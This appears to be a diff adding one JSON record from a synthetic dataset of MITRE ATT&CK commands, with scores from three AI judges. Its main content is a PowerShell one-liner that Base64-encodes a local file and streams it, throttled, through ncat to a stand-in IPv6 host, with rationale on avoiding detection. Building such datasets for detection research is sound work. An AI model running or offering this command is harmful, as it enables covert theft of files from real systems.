@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); [Text.RegularExpressions.Regex]::Matches($b,'.{1,900}') | ForEach-Object { $_.Value; Start-Sleep -Milliseconds 120 } | ncat.exe -6 2001:db8:dead:beef::27 63999 --send-only",
+  "explanation": "Streams Base64 data in throttled chunks over IPv6 TCP to a rarely used high port using ncat. Throttling and IPv6 provide a medium distinct from common exfil channels, consistent with T1011.",
+  "rationale_steps": [
+    "Chunk and lightly pace Base64 output to reduce traffic spikes.",
+    "Send chunks over an IPv6 TCP connection to a high, uncommon port to minimize detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-d261d43c",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting/parentheses, valid pipelining, and plausible ncat flags.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly streams Base64 chunks over IPv6 with throttling, this maps to alternative protocol use rather than T1011's different network medium (e.g., cellular/Bluetooth), and the documentation IPv6 address reduces operational realism.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:00:41.782337Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 3,
+        "syntactic_justification": "The PowerShell pipeline structure is mostly valid, but piping the ForEach-Object output directly into ncat.exe via the pipeline is unconventional and may not work as intended since ncat reads stdin but the pipeline behavior with Start-Sleep interleaved may not reliably stream chunks in the expected throttled manner.",
+        "semantic_score": 3,
+        "semantic_justification": "The command attempts to read, Base64-encode, chunk, and exfiltrate a file over IPv6 TCP using ncat, which is conceptually aligned with exfiltration, but T1011 specifically refers to exfiltration over a *different network medium* (e.g., cellular, Bluetooth, Wi-Fi as opposed to the primary wired/monitored channel), whereas this command simply uses IPv6 over standard TCP networking, making the T1011 mapping a stretch rather than a precise fit.",
+        "combined_score": 3.0,
+        "confidence": 0.75,
+        "timestamp": "2026-02-18T21:53:21.156763Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell syntax is perfectly formed, utilizing standard .NET methods, regex matching, and pipeline redirection to an external executable with valid flags.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively exfiltrates data via a throttled IPv6 stream, though IPv6 is technically a protocol layer rather than a strictly 'different network medium' like Bluetooth or Cellular as often associated with T1011.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T21:53:23.000154Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
